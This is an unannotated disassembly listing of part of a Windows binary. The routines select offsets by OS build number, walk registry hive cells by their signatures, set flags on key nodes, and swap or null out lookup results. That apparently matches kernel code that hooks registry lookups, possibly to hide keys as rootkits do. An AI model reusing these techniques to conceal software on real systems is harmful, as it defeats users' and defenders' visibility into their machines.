  40483f:	ff 15 14 60 40 00    	call   *0x406014
  404845:	68 b0 68 40 00       	push   $0x4068b0
  40484a:	b9 04 69 40 00       	mov    $0x406904,%ecx
  40484f:	8b c6                	mov    %esi,%eax
  404851:	e8 aa c9 ff ff       	call   0x401200
  404856:	81 ff 00 28 00 00    	cmp    $0x2800,%edi
  40485c:	72 14                	jb     0x404872
  40485e:	b8 20 69 40 00       	mov    $0x406920,%eax
  404863:	e8 08 f5 ff ff       	call   0x403d70
  404868:	b8 90 69 40 00       	mov    $0x406990,%eax
  40486d:	e8 fe f4 ff ff       	call   0x403d70
  404872:	81 ff 80 25 00 00    	cmp    $0x2580,%edi
  404878:	76 29                	jbe    0x4048a3
  40487a:	6a 00                	push   $0x0
  40487c:	68 f0 43 40 00       	push   $0x4043f0
  404881:	6a 00                	push   $0x0
  404883:	6a 00                	push   $0x0
  404885:	6a 00                	push   $0x0
  404887:	6a 00                	push   $0x0
  404889:	8d 44 24 24          	lea    0x24(%esp),%eax
  40488d:	50                   	push   %eax
  40488e:	ff 15 08 60 40 00    	call   *0x406008
  404894:	85 c0                	test   %eax,%eax
  404896:	7c 0b                	jl     0x4048a3
  404898:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40489c:	51                   	push   %ecx
  40489d:	ff 15 14 60 40 00    	call   *0x406014
  4048a3:	6a 00                	push   $0x0
  4048a5:	68 80 4f 40 00       	push   $0x404f80
  4048aa:	6a 00                	push   $0x0
  4048ac:	6a 00                	push   $0x0
  4048ae:	6a 00                	push   $0x0
  4048b0:	6a 00                	push   $0x0
  4048b2:	8d 54 24 24          	lea    0x24(%esp),%edx
  4048b6:	52                   	push   %edx
  4048b7:	ff 15 08 60 40 00    	call   *0x406008
  4048bd:	85 c0                	test   %eax,%eax
  4048bf:	7c 0b                	jl     0x4048cc
  4048c1:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4048c5:	50                   	push   %eax
  4048c6:	ff 15 14 60 40 00    	call   *0x406014
  4048cc:	33 c0                	xor    %eax,%eax
  4048ce:	5f                   	pop    %edi
  4048cf:	5e                   	pop    %esi
  4048d0:	5b                   	pop    %ebx
  4048d1:	8b e5                	mov    %ebp,%esp
  4048d3:	5d                   	pop    %ebp
  4048d4:	c2 08 00             	ret    $0x8
  4048d7:	cc                   	int3
  4048d8:	cc                   	int3
  4048d9:	cc                   	int3
  4048da:	cc                   	int3
  4048db:	cc                   	int3
  4048dc:	cc                   	int3
  4048dd:	cc                   	int3
  4048de:	cc                   	int3
  4048df:	cc                   	int3
  4048e0:	83 ec 08             	sub    $0x8,%esp
  4048e3:	53                   	push   %ebx
  4048e4:	55                   	push   %ebp
  4048e5:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  4048e9:	56                   	push   %esi
  4048ea:	57                   	push   %edi
  4048eb:	8d 44 24 14          	lea    0x14(%esp),%eax
  4048ef:	50                   	push   %eax
  4048f0:	8d 5c 24 14          	lea    0x14(%esp),%ebx
  4048f4:	8d 7c 24 20          	lea    0x20(%esp),%edi
  4048f8:	e8 73 10 00 00       	call   0x405970
  4048fd:	85 c0                	test   %eax,%eax
  4048ff:	0f 8c 1d 02 00 00    	jl     0x404b22
  404905:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  404909:	8b 54 24 10          	mov    0x10(%esp),%edx
  40490d:	8b 74 24 14          	mov    0x14(%esp),%esi
  404911:	89 4d 08             	mov    %ecx,0x8(%ebp)
  404914:	89 55 0c             	mov    %edx,0xc(%ebp)
  404917:	89 75 10             	mov    %esi,0x10(%ebp)
  40491a:	81 f9 28 0a 00 00    	cmp    $0xa28,%ecx
  404920:	75 11                	jne    0x404933
  404922:	83 fa 05             	cmp    $0x5,%edx
  404925:	0f 85 f2 01 00 00    	jne    0x404b1d
  40492b:	83 fe 01             	cmp    $0x1,%esi
  40492e:	e9 d0 01 00 00       	jmp    0x404b03
  404933:	81 f9 ce 0e 00 00    	cmp    $0xece,%ecx
  404939:	75 11                	jne    0x40494c
  40493b:	83 fa 05             	cmp    $0x5,%edx
  40493e:	0f 85 d9 01 00 00    	jne    0x404b1d
  404944:	83 fe 02             	cmp    $0x2,%esi
  404947:	e9 b7 01 00 00       	jmp    0x404b03
  40494c:	81 f9 70 17 00 00    	cmp    $0x1770,%ecx
  404952:	75 08                	jne    0x40495c
  404954:	83 fa 06             	cmp    $0x6,%edx
  404957:	e9 a3 01 00 00       	jmp    0x404aff
  40495c:	81 f9 71 17 00 00    	cmp    $0x1771,%ecx
  404962:	75 08                	jne    0x40496c
  404964:	83 fa 06             	cmp    $0x6,%edx
  404967:	e9 93 01 00 00       	jmp    0x404aff
  40496c:	81 f9 72 17 00 00    	cmp    $0x1772,%ecx
  404972:	75 08                	jne    0x40497c
  404974:	83 fa 06             	cmp    $0x6,%edx
  404977:	e9 83 01 00 00       	jmp    0x404aff
  40497c:	81 f9 b0 1d 00 00    	cmp    $0x1db0,%ecx
  404982:	74 08                	je     0x40498c
  404984:	81 f9 b1 1d 00 00    	cmp    $0x1db1,%ecx
  40498a:	75 2a                	jne    0x4049b6
  40498c:	83 fa 06             	cmp    $0x6,%edx
  40498f:	0f 85 88 01 00 00    	jne    0x404b1d
  404995:	83 fe 01             	cmp    $0x1,%esi
  404998:	0f 85 7f 01 00 00    	jne    0x404b1d
  40499e:	c7 45 00 14 00 00 00 	movl   $0x14,0x0(%ebp)
  4049a5:	c7 45 04 18 00 00 00 	movl   $0x18,0x4(%ebp)
  4049ac:	5f                   	pop    %edi
  4049ad:	5e                   	pop    %esi
  4049ae:	5d                   	pop    %ebp
  4049af:	5b                   	pop    %ebx
  4049b0:	83 c4 08             	add    $0x8,%esp
  4049b3:	c2 04 00             	ret    $0x4
  4049b6:	81 f9 f0 23 00 00    	cmp    $0x23f0,%ecx
  4049bc:	75 2a                	jne    0x4049e8
  4049be:	83 fa 06             	cmp    $0x6,%edx
  4049c1:	0f 85 56 01 00 00    	jne    0x404b1d
  4049c7:	83 fe 02             	cmp    $0x2,%esi
  4049ca:	0f 85 4d 01 00 00    	jne    0x404b1d
  4049d0:	c7 45 00 14 00 00 00 	movl   $0x14,0x0(%ebp)
  4049d7:	c7 45 04 18 00 00 00 	movl   $0x18,0x4(%ebp)
  4049de:	5f                   	pop    %edi
  4049df:	5e                   	pop    %esi
  4049e0:	5d                   	pop    %ebp
  4049e1:	5b                   	pop    %ebx
  4049e2:	83 c4 08             	add    $0x8,%esp
  4049e5:	c2 04 00             	ret    $0x4
  4049e8:	81 f9 80 25 00 00    	cmp    $0x2580,%ecx
  4049ee:	75 2a                	jne    0x404a1a
  4049f0:	83 fa 06             	cmp    $0x6,%edx
  4049f3:	0f 85 24 01 00 00    	jne    0x404b1d
  4049f9:	83 fe 03             	cmp    $0x3,%esi
  4049fc:	0f 85 1b 01 00 00    	jne    0x404b1d
  404a02:	c7 45 00 14 00 00 00 	movl   $0x14,0x0(%ebp)
  404a09:	c7 45 04 18 00 00 00 	movl   $0x18,0x4(%ebp)
  404a10:	5f                   	pop    %edi
  404a11:	5e                   	pop    %esi
  404a12:	5d                   	pop    %ebp
  404a13:	5b                   	pop    %ebx
  404a14:	83 c4 08             	add    $0x8,%esp
  404a17:	c2 04 00             	ret    $0x4
  404a1a:	81 f9 84 26 00 00    	cmp    $0x2684,%ecx
  404a20:	75 2a                	jne    0x404a4c
  404a22:	83 fa 06             	cmp    $0x6,%edx
  404a25:	0f 85 f2 00 00 00    	jne    0x404b1d
  404a2b:	83 fe 04             	cmp    $0x4,%esi
  404a2e:	0f 85 e9 00 00 00    	jne    0x404b1d
  404a34:	c7 45 00 14 00 00 00 	movl   $0x14,0x0(%ebp)
  404a3b:	c7 45 04 18 00 00 00 	movl   $0x18,0x4(%ebp)
  404a42:	5f                   	pop    %edi
  404a43:	5e                   	pop    %esi
  404a44:	5d                   	pop    %ebp
  404a45:	5b                   	pop    %ebx
  404a46:	83 c4 08             	add    $0x8,%esp
  404a49:	c2 04 00             	ret    $0x4
  404a4c:	81 f9 5a 27 00 00    	cmp    $0x275a,%ecx
  404a52:	74 18                	je     0x404a6c
  404a54:	81 f9 00 28 00 00    	cmp    $0x2800,%ecx
  404a5a:	74 10                	je     0x404a6c
  404a5c:	81 f9 5a 29 00 00    	cmp    $0x295a,%ecx
  404a62:	74 08                	je     0x404a6c
  404a64:	81 f9 d7 37 00 00    	cmp    $0x37d7,%ecx
  404a6a:	75 29                	jne    0x404a95
  404a6c:	83 fa 0a             	cmp    $0xa,%edx
  404a6f:	0f 85 a8 00 00 00    	jne    0x404b1d
  404a75:	85 f6                	test   %esi,%esi
  404a77:	0f 85 a0 00 00 00    	jne    0x404b1d
  404a7d:	c7 45 00 14 00 00 00 	movl   $0x14,0x0(%ebp)
  404a84:	c7 45 04 18 00 00 00 	movl   $0x18,0x4(%ebp)
  404a8b:	5f                   	pop    %edi
  404a8c:	5e                   	pop    %esi
  404a8d:	5d                   	pop    %ebp
  404a8e:	5b                   	pop    %ebx
  404a8f:	83 c4 08             	add    $0x8,%esp
  404a92:	c2 04 00             	ret    $0x4
  404a95:	81 f9 39 38 00 00    	cmp    $0x3839,%ecx
  404a9b:	74 5f                	je     0x404afc
  404a9d:	8d b9 c6 c7 ff ff    	lea    -0x383a(%ecx),%edi
  404aa3:	81 ff 9c 02 00 00    	cmp    $0x29c,%edi
  404aa9:	77 09                	ja     0x404ab4
  404aab:	83 fa 0a             	cmp    $0xa,%edx
  404aae:	75 04                	jne    0x404ab4
  404ab0:	85 f6                	test   %esi,%esi
  404ab2:	74 51                	je     0x404b05
  404ab4:	81 f9 d7 3a 00 00    	cmp    $0x3ad7,%ecx
  404aba:	74 40                	je     0x404afc
  404abc:	81 f9 ab 3f 00 00    	cmp    $0x3fab,%ecx
  404ac2:	74 38                	je     0x404afc
  404ac4:	81 f9 ee 42 00 00    	cmp    $0x42ee,%ecx
  404aca:	74 30                	je     0x404afc
  404acc:	81 f9 63 45 00 00    	cmp    $0x4563,%ecx
  404ad2:	74 28                	je     0x404afc
  404ad4:	81 f9 ba 47 00 00    	cmp    $0x47ba,%ecx
  404ada:	74 20                	je     0x404afc
  404adc:	81 f9 bb 47 00 00    	cmp    $0x47bb,%ecx
  404ae2:	74 18                	je     0x404afc
  404ae4:	81 f9 61 4a 00 00    	cmp    $0x4a61,%ecx
  404aea:	74 10                	je     0x404afc
  404aec:	81 f9 62 4a 00 00    	cmp    $0x4a62,%ecx
  404af2:	74 08                	je     0x404afc
  404af4:	81 f9 63 4a 00 00    	cmp    $0x4a63,%ecx
  404afa:	75 21                	jne    0x404b1d
  404afc:	83 fa 0a             	cmp    $0xa,%edx
  404aff:	75 1c                	jne    0x404b1d
  404b01:	85 f6                	test   %esi,%esi
  404b03:	75 18                	jne    0x404b1d
  404b05:	c7 45 00 10 00 00 00 	movl   $0x10,0x0(%ebp)
  404b0c:	c7 45 04 14 00 00 00 	movl   $0x14,0x4(%ebp)
  404b13:	5f                   	pop    %edi
  404b14:	5e                   	pop    %esi
  404b15:	5d                   	pop    %ebp
  404b16:	5b                   	pop    %ebx
  404b17:	83 c4 08             	add    $0x8,%esp
  404b1a:	c2 04 00             	ret    $0x4
  404b1d:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
  404b22:	5f                   	pop    %edi
  404b23:	5e                   	pop    %esi
  404b24:	5d                   	pop    %ebp
  404b25:	5b                   	pop    %ebx
  404b26:	83 c4 08             	add    $0x8,%esp
  404b29:	c2 04 00             	ret    $0x4
  404b2c:	cc                   	int3
  404b2d:	cc                   	int3
  404b2e:	cc                   	int3
  404b2f:	cc                   	int3
  404b30:	55                   	push   %ebp
  404b31:	8b ec                	mov    %esp,%ebp
  404b33:	83 e4 f8             	and    $0xfffffff8,%esp
  404b36:	56                   	push   %esi
  404b37:	8b f1                	mov    %ecx,%esi
  404b39:	8b 48 10             	mov    0x10(%eax),%ecx
  404b3c:	57                   	push   %edi
  404b3d:	51                   	push   %ecx
  404b3e:	56                   	push   %esi
  404b3f:	ff 15 18 8b 40 00    	call   *0x408b18
  404b45:	85 c0                	test   %eax,%eax
  404b47:	0f 84 bf 00 00 00    	je     0x404c0c
  404b4d:	83 78 14 00          	cmpl   $0x0,0x14(%eax)
  404b51:	0f 84 b5 00 00 00    	je     0x404c0c
  404b57:	8b 50 1c             	mov    0x1c(%eax),%edx
  404b5a:	52                   	push   %edx
  404b5b:	56                   	push   %esi
  404b5c:	ff 15 18 8b 40 00    	call   *0x408b18
  404b62:	85 c0                	test   %eax,%eax
  404b64:	0f 84 a2 00 00 00    	je     0x404c0c
  404b6a:	0f b7 48 02          	movzwl 0x2(%eax),%ecx
  404b6e:	66 85 c9             	test   %cx,%cx
  404b71:	0f 84 95 00 00 00    	je     0x404c0c
  404b77:	ba 72 69 00 00       	mov    $0x6972,%edx
  404b7c:	66 39 10             	cmp    %dx,(%eax)
  404b7f:	75 1b                	jne    0x404b9c
  404b81:	0f b7 c9             	movzwl %cx,%ecx
  404b84:	8b 14 88             	mov    (%eax,%ecx,4),%edx
  404b87:	52                   	push   %edx
  404b88:	56                   	push   %esi
  404b89:	ff 15 18 8b 40 00    	call   *0x408b18
  404b8f:	85 c0                	test   %eax,%eax
  404b91:	74 79                	je     0x404c0c
  404b93:	0f b7 48 02          	movzwl 0x2(%eax),%ecx
  404b97:	66 85 c9             	test   %cx,%cx
  404b9a:	74 70                	je     0x404c0c
  404b9c:	0f b7 10             	movzwl (%eax),%edx
  404b9f:	bf 6c 66 00 00       	mov    $0x666c,%edi
  404ba4:	66 3b d7             	cmp    %di,%dx
  404ba7:	74 12                	je     0x404bbb
  404ba9:	bf 6c 68 00 00       	mov    $0x686c,%edi
  404bae:	66 3b d7             	cmp    %di,%dx
  404bb1:	74 08                	je     0x404bbb
  404bb3:	0f b7 c9             	movzwl %cx,%ecx
  404bb6:	8b 14 88             	mov    (%eax,%ecx,4),%edx
  404bb9:	eb 07                	jmp    0x404bc2
  404bbb:	0f b7 c9             	movzwl %cx,%ecx
  404bbe:	8b 54 c8 fc          	mov    -0x4(%eax,%ecx,8),%edx
  404bc2:	52                   	push   %edx
  404bc3:	56                   	push   %esi
  404bc4:	ff 15 18 8b 40 00    	call   *0x408b18
  404bca:	8b f0                	mov    %eax,%esi
  404bcc:	85 f6                	test   %esi,%esi
  404bce:	74 34                	je     0x404c04
  404bd0:	b8 6e 6b 00 00       	mov    $0x6b6e,%eax
  404bd5:	66 39 06             	cmp    %ax,(%esi)
  404bd8:	75 2a                	jne    0x404c04
  404bda:	f6 46 0c 02          	testb  $0x2,0xc(%esi)
  404bde:	75 24                	jne    0x404c04
  404be0:	56                   	push   %esi
  404be1:	ff 15 fc 60 40 00    	call   *0x4060fc
  404be7:	6a 00                	push   $0x0
  404be9:	6a 50                	push   $0x50
  404beb:	52                   	push   %edx
  404bec:	50                   	push   %eax
  404bed:	ff 15 00 61 40 00    	call   *0x406100
  404bf3:	85 c0                	test   %eax,%eax
  404bf5:	74 15                	je     0x404c0c
  404bf7:	83 48 0c 02          	orl    $0x2,0xc(%eax)
  404bfb:	6a 50                	push   $0x50
  404bfd:	50                   	push   %eax
  404bfe:	ff 15 f8 60 40 00    	call   *0x4060f8
  404c04:	8b c6                	mov    %esi,%eax
  404c06:	5f                   	pop    %edi
  404c07:	5e                   	pop    %esi
  404c08:	8b e5                	mov    %ebp,%esp
  404c0a:	5d                   	pop    %ebp
  404c0b:	c3                   	ret
  404c0c:	5f                   	pop    %edi
  404c0d:	33 c0                	xor    %eax,%eax
  404c0f:	5e                   	pop    %esi
  404c10:	8b e5                	mov    %ebp,%esp
  404c12:	5d                   	pop    %ebp
  404c13:	c3                   	ret
  404c14:	cc                   	int3
  404c15:	cc                   	int3
  404c16:	cc                   	int3
  404c17:	cc                   	int3
  404c18:	cc                   	int3
  404c19:	cc                   	int3
  404c1a:	cc                   	int3
  404c1b:	cc                   	int3
  404c1c:	cc                   	int3
  404c1d:	cc                   	int3
  404c1e:	cc                   	int3
  404c1f:	cc                   	int3
  404c20:	55                   	push   %ebp
  404c21:	8b ec                	mov    %esp,%ebp
  404c23:	6a ff                	push   $0xffffffff
  404c25:	68 a8 6b 40 00       	push   $0x406ba8
  404c2a:	68 82 5a 40 00       	push   $0x405a82
  404c2f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404c35:	50                   	push   %eax
  404c36:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404c3d:	83 ec 0c             	sub    $0xc,%esp
  404c40:	53                   	push   %ebx
  404c41:	56                   	push   %esi
  404c42:	57                   	push   %edi
  404c43:	89 65 e8             	mov    %esp,-0x18(%ebp)
  404c46:	33 f6                	xor    %esi,%esi
  404c48:	89 75 fc             	mov    %esi,-0x4(%ebp)
  404c4b:	8b 45 0c             	mov    0xc(%ebp),%eax
  404c4e:	50                   	push   %eax
  404c4f:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404c52:	53                   	push   %ebx
  404c53:	ff 15 18 8b 40 00    	call   *0x408b18
  404c59:	3b c6                	cmp    %esi,%eax
  404c5b:	74 74                	je     0x404cd1
  404c5d:	80 3d 04 70 40 00 00 	cmpb   $0x0,0x407004
  404c64:	75 1a                	jne    0x404c80
  404c66:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  404c6d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404c70:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404c77:	5f                   	pop    %edi
  404c78:	5e                   	pop    %esi
  404c79:	5b                   	pop    %ebx
  404c7a:	8b e5                	mov    %ebp,%esp
  404c7c:	5d                   	pop    %ebp
  404c7d:	c2 08 00             	ret    $0x8
  404c80:	8b 15 24 8b 40 00    	mov    0x408b24,%edx
  404c86:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  404c89:	3b f2                	cmp    %edx,%esi
  404c8b:	73 d9                	jae    0x404c66
  404c8d:	8d 3c b5 78 9f 40 00 	lea    0x409f78(,%esi,4),%edi
  404c94:	8b 0f                	mov    (%edi),%ecx
  404c96:	3b c1                	cmp    %ecx,%eax
  404c98:	75 20                	jne    0x404cba
  404c9a:	8b c1                	mov    %ecx,%eax
  404c9c:	8b cb                	mov    %ebx,%ecx
  404c9e:	e8 8d fe ff ff       	call   0x404b30
  404ca3:	8d 0c b5 a0 9f 40 00 	lea    0x409fa0(,%esi,4),%ecx
  404caa:	89 01                	mov    %eax,(%ecx)
  404cac:	3b 07                	cmp    (%edi),%eax
  404cae:	75 b6                	jne    0x404c66
  404cb0:	c7 01 00 00 00 00    	movl   $0x0,(%ecx)
  404cb6:	33 c0                	xor    %eax,%eax
  404cb8:	eb ac                	jmp    0x404c66
  404cba:	8d 0c b5 a0 9f 40 00 	lea    0x409fa0(,%esi,4),%ecx
  404cc1:	3b 01                	cmp    (%ecx),%eax
  404cc3:	74 eb                	je     0x404cb0
  404cc5:	46                   	inc    %esi
  404cc6:	eb be                	jmp    0x404c86
  404cc8:	b8 01 00 00 00       	mov    $0x1,%eax
  404ccd:	c3                   	ret
  404cce:	8b 65 e8             	mov    -0x18(%ebp),%esp
  404cd1:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  404cd8:	33 c0                	xor    %eax,%eax
  404cda:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404cdd:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404ce4:	5f                   	pop    %edi
  404ce5:	5e                   	pop    %esi
  404ce6:	5b                   	pop    %ebx
  404ce7:	8b e5                	mov    %ebp,%esp
  404ce9:	5d                   	pop    %ebp
  404cea:	c2 08 00             	ret    $0x8
  404ced:	cc                   	int3
  404cee:	cc                   	int3
  404cef:	cc                   	int3
  404cf0:	55                   	push   %ebp
  404cf1:	8b ec                	mov    %esp,%ebp
  404cf3:	6a ff                	push   $0xffffffff
  404cf5:	68 88 6b 40 00       	push   $0x406b88
  404cfa:	68 82 5a 40 00       	push   $0x405a82
  404cff:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404d05:	50                   	push   %eax
  404d06:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404d0d:	83 ec 0c             	sub    $0xc,%esp
  404d10:	53                   	push   %ebx
  404d11:	56                   	push   %esi
  404d12:	57                   	push   %edi
  404d13:	89 65 e8             	mov    %esp,-0x18(%ebp)
  404d16:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  404d1d:	8b 45 10             	mov    0x10(%ebp),%eax
  404d20:	50                   	push   %eax
  404d21:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404d24:	51                   	push   %ecx
  404d25:	8b 55 08             	mov    0x8(%ebp),%edx
  404d28:	52                   	push   %edx
  404d29:	ff 15 18 8b 40 00    	call   *0x408b18
  404d2f:	8b f0                	mov    %eax,%esi
  404d31:	85 f6                	test   %esi,%esi
  404d33:	74 76                	je     0x404dab
  404d35:	ff 15 00 60 40 00    	call   *0x406000
  404d3b:	3c 02                	cmp    $0x2,%al
  404d3d:	72 1c                	jb     0x404d5b
  404d3f:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  404d46:	8b c6                	mov    %esi,%eax
  404d48:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404d4b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404d52:	5f                   	pop    %edi
  404d53:	5e                   	pop    %esi
  404d54:	5b                   	pop    %ebx
  404d55:	8b e5                	mov    %ebp,%esp
  404d57:	5d                   	pop    %ebp
  404d58:	c2 0c 00             	ret    $0xc
  404d5b:	80 3d 04 70 40 00 00 	cmpb   $0x0,0x407004
  404d62:	74 db                	je     0x404d3f
  404d64:	8b 3d c8 9f 40 00    	mov    0x409fc8,%edi
  404d6a:	85 ff                	test   %edi,%edi
  404d6c:	74 d1                	je     0x404d3f
  404d6e:	33 c0                	xor    %eax,%eax
  404d70:	8b 15 24 8b 40 00    	mov    0x408b24,%edx
  404d76:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404d79:	3b c2                	cmp    %edx,%eax
  404d7b:	73 c2                	jae    0x404d3f
  404d7d:	3b 34 85 78 9f 40 00 	cmp    0x409f78(,%eax,4),%esi
  404d84:	75 04                	jne    0x404d8a
  404d86:	8b f7                	mov    %edi,%esi
  404d88:	eb b5                	jmp    0x404d3f
  404d8a:	8d 0c 85 a0 9f 40 00 	lea    0x409fa0(,%eax,4),%ecx
  404d91:	3b 31                	cmp    (%ecx),%esi
  404d93:	75 0a                	jne    0x404d9f
  404d95:	c7 01 00 00 00 00    	movl   $0x0,(%ecx)
  404d9b:	33 f6                	xor    %esi,%esi
  404d9d:	eb a0                	jmp    0x404d3f
  404d9f:	40                   	inc    %eax
  404da0:	eb d4                	jmp    0x404d76
  404da2:	b8 01 00 00 00       	mov    $0x1,%eax
  404da7:	c3                   	ret
  404da8:	8b 65 e8             	mov    -0x18(%ebp),%esp
  404dab:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  404db2:	33 c0                	xor    %eax,%eax
  404db4:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404db7:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404dbe:	5f                   	pop    %edi
  404dbf:	5e                   	pop    %esi
  404dc0:	5b                   	pop    %ebx
  404dc1:	8b e5                	mov    %ebp,%esp
  404dc3:	5d                   	pop    %ebp
  404dc4:	c2 0c 00             	ret    $0xc
  404dc7:	cc                   	int3
  404dc8:	cc                   	int3
  404dc9:	cc                   	int3
  404dca:	cc                   	int3
  404dcb:	cc                   	int3
  404dcc:	cc                   	int3
  404dcd:	cc                   	int3
  404dce:	cc                   	int3
  404dcf:	cc                   	int3
  404dd0:	81 ec ac 09 00 00    	sub    $0x9ac,%esp
  404dd6:	53                   	push   %ebx
  404dd7:	55                   	push   %ebp
  404dd8:	56                   	push   %esi
  404dd9:	57                   	push   %edi
  404dda:	b9 1a 00 00 00       	mov    $0x1a,%ecx
  404ddf:	be 60 63 40 00       	mov    $0x406360,%esi
  404de4:	8d 7c 24 48          	lea    0x48(%esp),%edi
  404de8:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404dea:	8d 44 24 48          	lea    0x48(%esp),%eax
  404dee:	33 db                	xor    %ebx,%ebx
  404df0:	50                   	push   %eax
  404df1:	53                   	push   %ebx
  404df2:	88 5c 24 1f          	mov    %bl,0x1f(%esp)
  404df6:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
  404df8:	ff 15 9c 60 40 00    	call   *0x40609c
  404dfe:	3b c3                	cmp    %ebx,%eax
  404e00:	0f 8c 68 01 00 00    	jl     0x404f6e
  404e06:	8b 3d 18 60 40 00    	mov    0x406018,%edi
  404e0c:	8b 2d ac 60 40 00    	mov    0x4060ac,%ebp
  404e12:	33 f6                	xor    %esi,%esi
  404e14:	eb 0a                	jmp    0x404e20
  404e16:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  404e1d:	8d 49 00             	lea    0x0(%ecx),%ecx
  404e20:	68 00 01 00 00       	push   $0x100
  404e25:	8d 8c 24 bc 00 00 00 	lea    0xbc(%esp),%ecx
  404e2c:	53                   	push   %ebx
  404e2d:	51                   	push   %ecx
  404e2e:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  404e32:	e8 45 0c 00 00       	call   0x405a7c
  404e37:	68 00 08 00 00       	push   $0x800
  404e3c:	8d 94 24 c8 01 00 00 	lea    0x1c8(%esp),%edx
  404e43:	53                   	push   %ebx
  404e44:	52                   	push   %edx
  404e45:	e8 32 0c 00 00       	call   0x405a7c
  404e4a:	83 c4 18             	add    $0x18,%esp
  404e4d:	8d 44 24 48          	lea    0x48(%esp),%eax
  404e51:	50                   	push   %eax
  404e52:	8d 4c 24 44          	lea    0x44(%esp),%ecx
  404e56:	51                   	push   %ecx
  404e57:	ff d7                	call   *%edi
  404e59:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  404e5d:	50                   	push   %eax
  404e5e:	6a 01                	push   $0x1
  404e60:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  404e64:	8d 54 24 48          	lea    0x48(%esp),%edx
  404e68:	51                   	push   %ecx
  404e69:	c7 44 24 28 18 00 00 	movl   $0x18,0x28(%esp)
  404e70:	00 
  404e71:	89 5c 24 2c          	mov    %ebx,0x2c(%esp)
  404e75:	c7 44 24 34 40 00 00 	movl   $0x40,0x34(%esp)
  404e7c:	00 
  404e7d:	89 54 24 30          	mov    %edx,0x30(%esp)
  404e81:	89 5c 24 38          	mov    %ebx,0x38(%esp)
  404e85:	89 5c 24 3c          	mov    %ebx,0x3c(%esp)
  404e89:	ff d5                	call   *%ebp
  404e8b:	85 c0                	test   %eax,%eax
  404e8d:	0f 8c cc 00 00 00    	jl     0x404f5f
  404e93:	46                   	inc    %esi
  404e94:	56                   	push   %esi
  404e95:	68 e4 69 40 00       	push   $0x4069e4
  404e9a:	b8 00 01 00 00       	mov    $0x100,%eax
  404e9f:	8d 9c 24 c0 00 00 00 	lea    0xc0(%esp),%ebx
  404ea6:	e8 55 c1 ff ff       	call   0x401000
  404eab:	83 c4 08             	add    $0x8,%esp
  404eae:	8b d3                	mov    %ebx,%edx
  404eb0:	52                   	push   %edx
  404eb1:	8d 44 24 38          	lea    0x38(%esp),%eax
  404eb5:	50                   	push   %eax
  404eb6:	ff d7                	call   *%edi
  404eb8:	8d 4c 24 3c          	lea    0x3c(%esp),%ecx
  404ebc:	51                   	push   %ecx
  404ebd:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  404ec1:	68 00 10 00 00       	push   $0x1000
  404ec6:	8d 94 24 c0 01 00 00 	lea    0x1c0(%esp),%edx
  404ecd:	52                   	push   %edx
  404ece:	6a 02                	push   $0x2
  404ed0:	8d 44 24 44          	lea    0x44(%esp),%eax
  404ed4:	50                   	push   %eax
  404ed5:	51                   	push   %ecx
  404ed6:	ff 15 a4 60 40 00    	call   *0x4060a4
  404edc:	8b 54 24 18          	mov    0x18(%esp),%edx
  404ee0:	52                   	push   %edx
  404ee1:	85 c0                	test   %eax,%eax
  404ee3:	7c 72                	jl     0x404f57
  404ee5:	ff 15 14 60 40 00    	call   *0x406014
  404eeb:	8d 84 24 c4 01 00 00 	lea    0x1c4(%esp),%eax
  404ef2:	8d 50 02             	lea    0x2(%eax),%edx
  404ef5:	66 8b 08             	mov    (%eax),%cx
  404ef8:	83 c0 02             	add    $0x2,%eax
  404efb:	66 85 c9             	test   %cx,%cx
  404efe:	75 f5                	jne    0x404ef5
  404f00:	2b c2                	sub    %edx,%eax
  404f02:	d1 f8                	sar    $1,%eax
  404f04:	3d 08 02 00 00       	cmp    $0x208,%eax
  404f09:	73 3a                	jae    0x404f45
  404f0b:	8b 15 20 8b 40 00    	mov    0x408b20,%edx
  404f11:	69 d2 08 02 00 00    	imul   $0x208,%edx,%edx
  404f17:	8d 84 24 c4 01 00 00 	lea    0x1c4(%esp),%eax
  404f1e:	8b c8                	mov    %eax,%ecx
  404f20:	2b d1                	sub    %ecx,%edx
  404f22:	8d 92 28 8b 40 00    	lea    0x408b28(%edx),%edx
  404f28:	eb 06                	jmp    0x404f30
  404f2a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  404f30:	0f b7 08             	movzwl (%eax),%ecx
  404f33:	66 89 0c 02          	mov    %cx,(%edx,%eax,1)
  404f37:	83 c0 02             	add    $0x2,%eax
  404f3a:	66 85 c9             	test   %cx,%cx
  404f3d:	75 f1                	jne    0x404f30
  404f3f:	ff 05 20 8b 40 00    	incl   0x408b20
  404f45:	33 db                	xor    %ebx,%ebx
  404f47:	83 fe 0a             	cmp    $0xa,%esi
